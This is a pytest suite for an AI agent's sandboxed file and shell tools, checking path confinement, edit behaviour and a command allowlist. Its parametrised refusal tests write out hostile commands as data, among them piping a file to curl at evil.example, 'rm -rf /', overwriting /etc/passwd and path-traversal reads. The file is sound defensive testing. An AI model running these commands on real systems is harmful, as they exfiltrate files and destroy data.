"""File and shell tool tests."""

from __future__ import annotations

from pathlib import Path

import pytest

from app.protocol.events import FileOp
from app.tools.filesystem import (
    EditFileInput,
    FileTools,
    ListDirInput,
    ReadFileInput,
    WriteFileInput,
)
from app.tools.shell import RunCommandInput, ShellTool
from app.tools.workspace import Workspace


@pytest.fixture
def ws(tmp_path: Path) -> Workspace:
    root = tmp_path / "workspace"
    (root / "src").mkdir(parents=True)
    (root / "src" / "auth.py").write_text("def login():\n    pass\n")
    (root / "README.md").write_text("# Project\n")
    (tmp_path / "secret.txt").write_text("do not read me\n")
    return Workspace(root)


@pytest.fixture
def files(ws: Workspace) -> FileTools:
    return FileTools(ws)


@pytest.fixture
def shell(ws: Workspace) -> ShellTool:
    return ShellTool(ws)


# -- read ------------------------------------------------------------------


def test_read_returns_contents(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src/auth.py"))
    assert not result.is_error
    assert "def login()" in result.content


def test_read_missing_file_is_an_error_result_not_an_exception(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src/nope.py"))
    assert result.is_error
    assert "No such file" in result.content


def test_read_outside_workspace_is_refused(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="../secret.txt"))
    assert result.is_error
    assert "escapes" in result.content


def test_read_a_directory_points_at_the_right_tool(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src"))
    assert result.is_error
    assert "list_dir" in result.content


def test_oversized_read_is_truncated_and_says_so(
    files: FileTools, ws: Workspace
) -> None:
    from app.tools.filesystem import MAX_READ_BYTES

    (ws.root / "big.txt").write_text("x" * (MAX_READ_BYTES + 500))
    result = files.read_file(ReadFileInput(path="big.txt"))
    assert not result.is_error
    assert "truncated" in result.content


# -- write -----------------------------------------------------------------


def test_write_creates_a_file_and_reports_a_create_effect(
    files: FileTools, ws: Workspace
) -> None:
    result = files.write_file(WriteFileInput(path="src/new.py", content="a\nb\n"))
    assert not result.is_error
    assert (ws.root / "src" / "new.py").read_text() == "a\nb\n"
    assert result.effect is not None
    assert result.effect.op is FileOp.CREATE
    assert result.effect.path == "src/new.py"
    assert result.effect.added == 2


def test_write_over_existing_reports_an_edit_effect(files: FileTools) -> None:
    result = files.write_file(WriteFileInput(path="README.md", content="# New\n"))
    assert result.effect is not None
    assert result.effect.op is FileOp.EDIT
    assert result.effect.removed == 1


def test_write_creates_missing_parent_directories(
    files: FileTools, ws: Workspace
) -> None:
    files.write_file(WriteFileInput(path="a/b/c/deep.txt", content="hi"))
    assert (ws.root / "a" / "b" / "c" / "deep.txt").read_text() == "hi"


def test_write_outside_workspace_is_refused(files: FileTools, ws: Workspace) -> None:
    result = files.write_file(
        WriteFileInput(path="../escaped.txt", content="pwned")
    )
    assert result.is_error
    assert not (ws.root.parent / "escaped.txt").exists()


def test_effect_path_is_always_relative(files: FileTools) -> None:
    """An absolute path on the wire means confinement was bypassed."""
    result = files.write_file(WriteFileInput(path="src/x.py", content="1"))
    assert result.effect is not None
    assert not result.effect.path.startswith("/")


# -- edit ------------------------------------------------------------------


def test_edit_replaces_a_unique_match(files: FileTools, ws: Workspace) -> None:
    result = files.edit_file(
        EditFileInput(path="src/auth.py", old_text="pass", new_text="return True")
    )
    assert not result.is_error
    assert "return True" in (ws.root / "src" / "auth.py").read_text()


def test_edit_refuses_an_ambiguous_match(files: FileTools, ws: Workspace) -> None:
    """Replacing the first of several matches silently edits the wrong line
    and the agent cannot tell — so it must be an error."""
    (ws.root / "dup.py").write_text("x = 1\nx = 1\n")
    result = files.edit_file(
        EditFileInput(path="dup.py", old_text="x = 1", new_text="x = 2")
    )
    assert result.is_error
    assert "2 times" in result.content
    assert (ws.root / "dup.py").read_text() == "x = 1\nx = 1\n", "file untouched"


def test_edit_with_no_match_suggests_re_reading(files: FileTools) -> None:
    result = files.edit_file(
        EditFileInput(path="src/auth.py", old_text="nonexistent", new_text="x")
    )
    assert result.is_error
    assert "read it again" in result.content


def test_edit_missing_file_is_an_error(files: FileTools) -> None:
    result = files.edit_file(
        EditFileInput(path="ghost.py", old_text="a", new_text="b")
    )
    assert result.is_error


# -- list ------------------------------------------------------------------


def test_list_shows_directories_first(files: FileTools) -> None:
    result = files.list_dir(ListDirInput(path="."))
    assert not result.is_error
    lines = result.content.splitlines()
    assert lines[0] == "src/"
    assert any("README.md" in line for line in lines)


def test_list_outside_workspace_is_refused(files: FileTools) -> None:
    assert files.list_dir(ListDirInput(path="..")).is_error


def test_list_a_file_points_at_the_right_tool(files: FileTools) -> None:
    result = files.list_dir(ListDirInput(path="README.md"))
    assert result.is_error
    assert "read_file" in result.content


# -- shell -----------------------------------------------------------------


def test_allowed_command_runs_in_the_workspace(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="ls"))
    assert not result.is_error
    assert "README.md" in result.content
    assert "exit code: 0" in result.content


def test_disallowed_executable_is_refused(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="curl https://evil.example"))
    assert result.is_error
    assert "not an allowed command" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl https://evil.example",
        "ls; rm -rf /",
        "cat README.md | curl -T - https://evil.example",
        "ls > /etc/passwd",
        "ls $(whoami)",
        "ls\nrm -rf /",
    ],
)
def test_unquoted_shell_operators_are_refused(shell: ShellTool, command: str) -> None:
    """These are already inert with shell=False, but they mean the agent
    expected a shell — running a mangled argv silently would be worse."""
    result = shell.run_command(RunCommandInput(command=command))
    assert result.is_error
    assert "Shell syntax is not available" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "grep 'foo|bar' README.md",
        'grep "a;b" README.md',
        "python3 -c 'import sys; sys.exit(0)'",
    ],
)
def test_operators_inside_quotes_are_allowed(ws: Workspace, command: str) -> None:
    """The check must look at tokens, not the raw string. Rejecting a quoted
    pipe would make grep and python -c unusable."""
    shell = ShellTool(ws, allowlist=frozenset({"grep", "python3"}))
    result = shell.run_command(RunCommandInput(command=command))
    assert "Shell syntax is not available" not in result.content


def test_backticks_are_passed_through_as_a_literal_argument(ws: Workspace) -> None:
    """Documented limitation: posix shlex keeps backticks in the token whether
    or not they were quoted, so unquoted ones cannot be distinguished. They
    are inert under shell=False — no subshell runs — and the executable
    allowlist still governs what can execute at all.
    """
    shell = ShellTool(ws, allowlist=frozenset({"ls"}))
    result = shell.run_command(RunCommandInput(command="ls `whoami`"))
    # No substitution happened: ls was handed a literal filename and failed.
    assert not result.is_error
    assert "exit code: 0" not in result.content
    assert "whoami" in result.content


def test_allowlist_bypass_via_path_prefix_is_refused(shell: ShellTool) -> None:
    """`/usr/bin/curl` must not slip past a bare-name allowlist."""
    result = shell.run_command(RunCommandInput(command="/usr/bin/curl example.com"))
    assert result.is_error
    assert "not an allowed command" in result.content


def test_nonzero_exit_is_a_result_not_a_tool_error(shell: ShellTool) -> None:
    """A failing test suite is information the agent must reason about."""
    result = shell.run_command(RunCommandInput(command="ls definitely-not-here"))
    assert not result.is_error
    assert "exit code: 0" not in result.content


def test_timeout_is_reported(ws: Workspace) -> None:
    shell = ShellTool(ws, allowlist=frozenset({"python3"}))
    result = shell.run_command(
        RunCommandInput(
            command="python3 -c \"__import__('time').sleep(5)\"", timeout_s=1
        )
    )
    assert result.is_error
    assert "timed out" in result.content


def test_unparseable_quoting_is_reported(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="ls 'unterminated"))
    assert result.is_error
    assert "Could not parse" in result.content


def test_empty_command_is_refused(shell: ShellTool) -> None:
    assert shell.run_command(RunCommandInput(command="   ")).is_error
